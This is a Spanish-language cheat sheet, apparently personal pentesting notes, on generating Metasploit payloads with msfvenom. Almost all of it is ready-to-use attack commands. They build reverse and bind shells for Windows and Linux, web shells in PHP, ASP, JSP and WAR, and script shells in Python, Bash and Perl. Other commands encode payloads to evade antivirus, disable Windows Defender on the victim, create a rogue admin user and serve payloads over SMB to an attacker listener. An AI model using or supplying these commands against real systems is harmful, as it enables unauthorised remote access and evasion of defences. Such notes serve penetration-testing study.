Es una herramienta de mestasploit para crear nuestro propio payload y poder ejecutarlo en la maquina víctima.

Nos muestra los payloads que tenemos disponibles.

```shell
msfvenom -l payloads 
```

## Tipos :

* Stage: Envia el codigo malicioso en varias etapas para no ser detectado a veces no se puede usar con msfvenom sino con [[Metasploit]] directamente.

* Stageless: Envia el codigo entero puede ser detectado , sí lo puede usar msfvenom. 

Usar un payload que hemos visto con la opcion "-p" se lo indicamos y la opción "--list-options" vemos las opciones que son necesarias para poder ejecutarlo.

```shell
msfvenom -p windows/adduser --list-options
```

Con la opcion -f , podemos ver el formato que queremos que cree el payload

```shell
msfvenom -p windows/adduser -f exe -o adduser.exe
```

Deshabilitamos el firewall de windows con la instruccion en la maquina víctima

```shell
Set-MpPreference -disableRealtimeMonitoring $true
```

y creamos el ejecutable.

Compartimos el archivo mediante "impacket-smbserver", compartimos el directorio que estamos actualmente

```shell
impacket-smbserver share ./
```

Si no se puede conectar probamos lo mismo pero obligando a introducir un usuario y una contraseña 

```shell
impacket-smbserver share ./ -smb2support -username test -password test
```

por ultimo desde windows nos conectamos desde la barra de ejecucion

```shell 
\\<ip kali>\share
```



## Shell reversa en windows stageless

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=8001 -f exe -o shellp8001.exe
```

y me pongo en escucha en kali con netcat

```shell
nc -lvnp 8001
```

## Algunos ejemplos extras

```shell
# Crear un payload
msfvenom -p [payload] LHOST=[IPAtacante] LPORT=[PuertoEscucha]

# Listar payloads
msfvenom -l payloads

# Listar opciones de payloads
msfvenom -p [payload] --list-options
msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options

# Crear un payload encodeado
msfvenom -p [payload] -e [encoder] -f [FormatoSalida] -i [iteración]  > ArchivoResultante

# Crear un payload usando una plantilla
msfvenom -p [payload]  -x [Plantilla] -f [FormatoSalida] > ArchivoResultante

# Poner a la escucha Payloads en Metasploit:
msf6>use exploit/multi/handler
msf6>set payload windows/meterpreter/reverse_tcp
msf6>set lhost [IP]
msf6>set lport  [Puerto]
msf6> set ExitOnSession false
msf6>exploit -j

#  Payloads para Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f exe > shell.exe

msfvenom -p windows/meterpreter_reverse_http LHOST=[IPAtacante] LPORT=[PuertoEscucha] HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe

msfvenom -p windows/meterpreter/bind_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f exe > shell.exe

msfvenom -p windows/shell/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f exe > shell.exe

msfvenom -p windows/shell_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f exe > shell.exe



#  Payloads para Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f elf > shell.elf

msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f elf > shell.elf

msfvenom -p linux/x64/shell_bind_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f elf > shell.elf

msfvenom -p linux/x64/shell_reverse_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f elf > shell.elf


# Add a user in windows with msfvenom:
msfvenom -p windows/adduser USER=[usuario] PASS=[password] -f exe > adduser.exe

#  Generar Web Payloads

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.php
cat shell.php | pbcopy && echo shell.php && pbpaste >> shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f war > shell.war


#  Payloads en formato script
# Lenguaje Python
msfvenom -p cmd/unix/reverse_python LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.py

# Lenguaje Bash
msfvenom -p cmd/unix/reverse_bash LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.sh

# Lenguaje Perl
msfvenom -p cmd/unix/reverse_perl LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.pl

# Crear un payload encodeado borrando los caracteres malos:
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
```